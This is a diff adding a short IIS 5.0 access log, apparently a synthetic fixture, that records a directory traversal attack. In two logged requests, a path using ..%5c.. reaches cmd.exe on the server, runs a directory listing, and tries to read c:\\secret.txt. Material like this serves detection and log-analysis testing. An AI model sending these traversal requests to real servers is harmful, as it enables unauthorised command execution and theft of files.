@@ -1,0 +1,7 @@
+#Software: Microsoft Internet Information Services 5.0
+#Version: 1.0
+#Date: 2026-10-22 14:32:03
+#Fields: date time c-ip cs-username s-ip s-port cs-method cs-uri-stem cs-uri-query sc-status cs-host cs(User-Agent)
+2026-10-22 14:34:53 203.0.113.21 - 192.0.2.10 80 GET /Default.htm - 200 www.example.test Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1)
+2026-10-22 14:48:06 203.0.113.21 - 192.0.2.10 80 GET /scripts/..%5c../winnt/system32/cmd.exe /c+dir+c:\ 200 www.example.test Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1)
+2026-10-22 14:51:15 203.0.113.21 - 192.0.2.10 80 GET /scripts/..%5c../winnt/system32/cmd.exe /c+type+c:\secret.txt 502 www.example.test Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1)
